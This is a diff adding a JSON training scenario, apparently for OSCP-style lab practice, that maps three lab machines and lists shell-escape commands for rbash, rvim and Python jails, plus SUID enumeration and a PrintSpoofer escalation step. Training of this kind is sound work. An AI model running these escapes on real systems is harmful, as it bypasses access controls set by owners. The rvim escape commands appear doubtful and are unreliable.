@@ -1,0 +1,129 @@
+{
+  "id": "the-restricted-shell",
+  "title": "The Restricted Shell",
+  "category": "edge-case",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "Every initial shell is restricted: rbash, rvim, Python jail. Must escape before proceeding. 3 machines, 1 network, 1 Windows, 2 Linux.",
+  "introduction": "This scenario teaches shell escape techniques—rbash, rvim, Python jail—that block enumeration until bypassed. Essential when initial access gives limited shell.",
+  "mental_model": "Restricted shells block /bin/bash and PATH. Use vi/vim to spawn a real shell, or override shell via SSH -t. Python jails: abuse __import__ or breakpoint().",
+  "key_principles": [
+    "rbash: ssh -t 'bash --noprofile' or vi :shell",
+    "rvim: :set shell=/bin/bash then :shell or :!bash",
+    "Python jail: __import__('os').system() or breakpoint()",
+    "Escape first; linpeas/winpeas need full shell",
+    "Check EDITOR env; vi often available in restricted envs"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 2,
+    "rabbit_hole_risk": 3,
+    "time_pressure": 4
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004"],
+    "techniques": [
+      {"id": "T1059.004", "name": "Unix Shell"},
+      {"id": "T1059.006", "name": "Python"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 2},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "rbash", "restricted-shell", "rvim", "python-jail",
+    "escape", "vi-escape", "vim-escape"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "low",
+    "recommended_order": 20
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.65.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "rbash-box",
+      "label": "RBASH-BOX",
+      "ip": "10.10.65.10",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH drops to rbash", "leads_to": "rbash"}], "commands": ["ssh restricted@10.10.65.10"]},
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Web RCE → rbash", "leads_to": "rbash"}], "commands": []}
+      ],
+      "privesc": [
+        {"from": "restricted", "to": "user", "technique": "rbash escape", "commands": [{"cmd": "ssh restricted@10.10.65.10 -t 'bash --noprofile'", "rationale": "Why: Bypass rbash by invoking full bash directly"}, "ssh restricted@10.10.65.10 -t '/bin/bash'", "vi", {"cmd": ":set shell=/bin/bash", "rationale": "Why: Point vi to real shell for :shell escape"}, ":shell"]},
+        {"from": "user", "to": "root", "technique": "SUID", "commands": ["find / -perm -4000 2>/dev/null"]}
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "rvim-box",
+      "label": "RVIM-BOX",
+      "ip": "10.10.65.11",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH → rvim as default editor", "leads_to": "rvim"}], "commands": ["ssh editor@10.10.65.11"]},
+        {"port": 443, "name": "HTTPS", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Web RCE → rvim", "leads_to": "rvim"}], "commands": []}
+      ],
+      "privesc": [
+        {"from": "editor", "to": "user", "technique": "rvim escape", "commands": [":set shell=/bin/bash", ":shell", ":!bash", ":!id"]},
+        {"from": "user", "to": "root", "technique": "sudo", "commands": ["sudo -l"]}
+      ],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "pyjail-box",
+      "label": "PYJAIL-BOX",
+      "ip": "10.10.65.12",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Python sandbox escape", "leads_to": "restricted-cmd"}], "commands": [{"cmd": "__import__('os').system('whoami')", "rationale": "Why: Bypass Python jail filter to run OS commands"}, "__import__('subprocess').call(['cmd','/c','whoami'])"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM after escape", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [
+        {"from": "restricted", "to": "user", "technique": "Python jail escape", "commands": [{"cmd": "breakpoint()", "rationale": "Why: Drop to debugger to bypass restricted builtins"}, "import os; os.system('cmd')", "__builtins__.__import__('os').system('cmd')"]},
+        {"from": "user", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}
+      ],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {"id": "path-rbash", "name": "RBASH-BOX: rbash escape", "color": "#6bb8cc", "steps": ["rbash-box"], "description": "rbash → bash --noprofile or vi :shell"},
+    {"id": "path-rvim", "name": "RVIM-BOX: rvim escape", "color": "#e8a87c", "steps": ["rvim-box"], "description": "rvim → :set shell=/bin/bash :shell"},
+    {"id": "path-pyjail", "name": "PYJAIL-BOX: Python escape", "color": "#85e89d", "steps": ["pyjail-box"], "description": "Python jail → __import__('os').system()"}
+  ]
+}
